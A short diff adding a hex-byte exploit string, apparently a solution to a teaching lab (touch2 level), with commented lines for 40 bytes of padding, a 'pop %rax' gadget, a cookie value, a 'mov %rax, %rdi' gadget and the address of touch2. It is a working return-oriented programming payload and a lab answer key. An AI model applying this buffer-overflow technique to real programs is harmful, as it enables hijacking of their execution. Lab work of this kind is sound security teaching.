@@ -1,0 +1,8 @@
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+00 00 00 00 00 00 00 00 00 00 /* Padding for 40 bytes */
+44 19 40 00 00 00 00 00 /* Gadget (pop %rax) */
+be b1 6e 66 00 00 00 00 /* Cookie */
+3d 19 40 00 00 00 00 00 /* Gadget (mov %rax, %rdi) */
+c3 17 40 00 00 00 00 00 /* Address of touch2 + padding for 8 byted of address */
